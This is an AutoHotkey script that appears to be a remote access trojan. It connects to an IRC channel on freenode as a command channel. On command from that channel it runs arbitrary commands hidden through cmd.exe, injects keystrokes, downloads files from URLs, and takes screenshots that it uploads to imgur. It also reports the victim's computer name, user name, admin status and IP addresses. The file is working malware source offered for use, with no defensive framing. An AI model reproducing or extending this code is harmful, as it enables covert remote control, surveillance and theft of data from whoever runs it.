StringCaseSense, On
#Include Socket.ahk
#Include GDIp.ahk
#Include Cap.ahk
#SingleInstance force
#Persistent
imgurClient := "acfb959db3ad8f6"
Listvars,
Soundbeep, 640, 15
Index = 0
SetFormat, IntegerFast, HEX
Random, Rand, 17, 255
StringTrimLeft, Rand, Rand, 2
Nick := "client_"rand
SetFormat, IntegerFast, Decimal
star := "*"
Serv := ["chat.freenode.net", 6667]
Chan := "#ahkrat"
BaseVar = Error

Client := new IRC()
Client.hLog := hLog
Client.hChat := hChat
Client.Connect(Serv, Nick)
Client.SendText("JOIN " Chan)
CoordMode, Tooltip, Screen 
Loop, {



Input := A_IconTip
Menu, tray, tip, 0
tooltip, % ErrorLevel 	Input, -2, 1
	IfInString, Input, $*, GoSub, SetVar
	IfInString, Input, $%rand%, GoSub, SetVar
IfInString, Input, *          , GoSub, Command
IfInString, Input, %Rand%, GoSub, Command

Sleep, 256
}
return
SetVar:
StringReplace, Input, Input, $, , All
StringReplace, Input, Input, %rand%, , All
StringReplace, Input, Input, *, , All

StringLeft, isSpace, Input, 1
if (isSpace = A_Space)
{
StringTrimLeft, Input, input, 1
}

BaseVar := Input
 Client.SendText("PRIVMSG " Chan " :" "Base Variable Set = "BaseVar)
return
Command:
StringReplace, InputCC, Input, %rand%, , All
StringReplace, InputS, InputCC, `*, , All
InputC := StrReplace(InputS, A_Space)
if IsLabel(InputC)
    gosub, % InputC
else
    Client.SendText("PRIVMSG " Chan " :" "Unknown Command/Label = "InputC)
return
;--------------------------------------Commands-------------------PAYLOADS---PAYLOADS---PAYLOADS---PAYLOADS---PAYLOADS---PAYLOADS---PAYLOADS--
payload.msgbox:
p.msgbox:
payload.message:
payload.1:
msgbox,0, %BaseVar%,%BaseVar%, 4300
return

payload.monsleep:
payload.monoff:
payload.monitorsleep:
p.monoff:
payload.2:
SendMessage, 0x112, 0xF170, 2,, Program Manager
return

payload.runvar:
payload.run:
p.run:
payload.3:

Run, %BaseVar%,
return

payload.runhide:
p.runhide:
payload.3h:

Run, %BaseVar%,,Hide
return

payload.runcmd:
payload.cmd:
p.cmd:
payload.4:
run, %ComSpec% /c %BaseVar%,,Hide
return

payload.type:
payload.sendkeys:
payload.send:
p.send:
p.type:
payload.5:
SendInput, %BaseVar%
return

payload.beep:
p.beep:
payload.playbeep:
payload.6:
Soundbeep, %BaseVar%, 512
return

payload.mr:
payload.ranmouse:
payload.mouserandom:
p.mr:
p.rm:
payload.7:
Random, W, 10, % A_ScreenWidth
Random, H, 4, % A_ScreenHeight
MouseMove, %W%,%H%, 
return

payload.soundmax:
payload.setsound:
p.max:
payload.8:
SoundSet, 100
return

payload.ding:
payload.errorsound:
p.err:
payload.9:
SoundPlay, *16
return

payload.splash:
payload.image:
payload.img:
p.img:
payload.10:
random, pic, 
loc = %temp%\%pic%.png
if !FileExist(loc)
	URLDownloadToFile, %BaseVar%, %temp%\%pic%.png
SplashImage,%temp%\%pic%.png, B
Sleep, 1250
SplashImage, Off
return

payload.download:
payload.down:
p.dwn:
payload.11:
StringSplit, Down, BaseVar,! 
DownTo = % Temp "\" Down1
msgbox, URLDownloadToFile %Down2% %DownTo%
URLDownloadToFile, %Down2%, %DownTo%
return

payload.pullscreen:
Random, ImageID
ScreenshotFile := Temp "\image" ImageID ".png"
TakeScreenshot(ScreenshotFile)
Sleep, 256
Goto, imgur
return









;--------------------------------------Commands-------------------DEBUG---DEBUG---DEBUG---DEBUG---DEBUG---DEBUG---DEBUG--
return
debug.re:
d.re:
debug.respond:
Client.SendText("PRIVMSG " Chan " :" "Respond = BaseVar:" BaseVar " - Clipboard:" Clipboard " - ErrorLevel:" ErrorLevel)
return
debug.iAm:
d.iam:
Client.SendText("PRIVMSG " Chan " :" "i am = ID:  "Rand "		PCname:  "A_ComputerName "		UserName:  "A_UserName "		AmAdmin:  "A_IsAdmin "		 IPs(1-4):  "A_IPAddress1 "  " A_IPAddress2 "  "  A_IPAddress3 "  " A_IPAddress4)
return
debug.note:
d.note:
Client.SendText("PRIVMSG " Chan " :" Rand)
return




return
class IRC extends SocketTCP
{
	static Blocking := False
	static Buffer, hLog, hChat

	Connect(Address, Nick, User:="", Name:="", Pass:="")
	{
		this.Nick := Nick
		this.User := (User == "") ? Nick : User
		this.Name := (Name == "") ? Nick : Name
		Socket.Connect.Call(this, Address)
		if (Pass != "")
			this.SendText("PASS " Pass)
		this.SendText("NICK " this.Nick)
		this.SendText("USER " this.User " 0 * :" this.Name)
	}
	
	SendText(Text, Encoding:="UTF-8")
	{
		SocketTCP.SendText.Call(this, Text "`r`n",, Encoding)
	}
	
	OnRecv()
	{
		; Read the incoming bytes as ANSI (single byte encoding)
		; so we won't accidentally destroy partial UTF-8 multi-byte sequences.
		this.Buffer .= this.RecvText(,, "CP0")
		
		; Split the buffer into one or more lines, putting
		; any remaining text back into the buffer.
		Lines := StrSplit(this.Buffer, "`n", "`r")
		this.Buffer := Lines.Pop()
		
		for Index, Line in Lines
		{
			; Convert to UTF-8 now that we have a full line.
			; Because we read until the end of the line,
			; we know there won't be any partially read sequences.
			VarSetCapacity(ConvBuf, StrPut(Line, "CP0"))
			StrPut(Line, &ConvBuf, "CP0")
			Line := StrGet(&ConvBuf, "UTF-8")
			
			
			this.ParseLine(Line)
		}

	}
	
	ParseLine(Line)
	{
		IRCRE := "O)^(?::(\S+?)(?:!(\S+?))?(?:@(\S+?))? )?" ; Nick!User@Host
		. "(\S+)(?: (?!:)(.+?))?(?: :(.+))?$" ; CMD Params Params :Message
		if !RegExMatch(Line, IRCRE, Match)
			tooltip, parseerror
		
		; Call the class method by the name OnCMD
		this["On" Match[4]](Match)
		Menu, tray, tip, % Match[6]
	}
	
		OnPING(Match)
	{
		this.SendText("PONG :" Match[6])
	}
	
	
}

return
!esc::
  Client.SendText("PRIVMSG " Chan " :" "Real Exit")
  Sleep, 200
exitapp
return

imgur:
File := FileOpen(ScreenshotFile, "r")
File.RawRead(Data, File.Length)
Base64enc( PNGDATA, Data, File.Length )
http := ComObjCreate("WinHttp.WinHttpRequest.5.1")
http.Open("POST","https://api.imgur.com/3/upload")
http.SetRequestHeader("Authorization","Client-ID " imgurClient)
http.Send(PNGDATA)
codes := http.ResponseText

isOK := json(codes, "success")
link := RegExReplace(json(codes, "data.link"),"\\") 
Client.SendText("PRIVMSG " Chan " :" isOK "	" link)
Return

Base64enc( ByRef OutData, ByRef InData, InDataLen ) {
 DllCall( "Crypt32.dll\CryptBinaryToString" ( A_IsUnicode ? "W" : "A" )
        , UInt,&InData, UInt,InDataLen, UInt,1, UInt,0, UIntP,TChars, "CDECL Int" )
 VarSetCapacity( OutData, Req := TChars * ( A_IsUnicode ? 2 : 1 ) )
 DllCall( "Crypt32.dll\CryptBinaryToString" ( A_IsUnicode ? "W" : "A" )
        , UInt,&InData, UInt,InDataLen, UInt,1, Str,OutData, UIntP,Req, "CDECL Int" )
Return TChars
}

json(ByRef js, s, v = "") {
	j = %js%
	Loop, Parse, s, .
	{
		p = 2
		RegExMatch(A_LoopField, "([+\-]?)([^[]+)((?:\[\d+\])*)", q)
		Loop {
			If (!p := RegExMatch(j, "(?<!\\)(""|')([^\1]+?)(?<!\\)(?-1)\s*:\s*((\{(?:[^{}]++|(?-1))*\})|(\[(?:[^[\]]++|(?-1))*\])|"
				. "(?<!\\)(""|')[^\7]*?(?<!\\)(?-1)|[+\-]?\d+(?:\.\d*)?|true|false|null?)\s*(?:,|$|\})", x, p))
				Return
			Else If (x2 == q2 or q2 == "*") {
				j = %x3%
				z += p + StrLen(x2) - 2
				If (q3 != "" and InStr(j, "[") == 1) {
					StringTrimRight, q3, q3, 1
					Loop, Parse, q3, ], [
					{
						z += 1 + RegExMatch(SubStr(j, 2, -1), "^(?:\s*((\[(?:[^[\]]++|(?-1))*\])|(\{(?:[^{\}]++|(?-1))*\})|[^,]*?)\s*(?:,|$)){" . SubStr(A_LoopField, 1) + 1 . "}", x)
						j = %x1%
					}
				}
				Break
			}
			Else p += StrLen(x)
		}
	}
	If v !=
	{
		vs = "
		If (RegExMatch(v, "^\s*(?:""|')*\s*([+\-]?\d+(?:\.\d*)?|true|false|null?)\s*(?:""|')*\s*$", vx)
			and (vx1 + 0 or vx1 == 0 or vx1 == "true" or vx1 == "false" or vx1 == "null" or vx1 == "nul"))
			vs := "", v := vx1
		StringReplace, v, v, ", \", All
		js := SubStr(js, 1, z := RegExMatch(js, ":\s*", zx, z) + StrLen(zx) - 1) . vs . v . vs . SubStr(js, z + StrLen(x3) + 1)
	}
	Return, j == "false" ? 0 : j == "true" ? 1 : j == "null" or j == "nul"
		? "" : SubStr(j, 1, 1) == """" ? SubStr(j, 2, -1) : j
}
return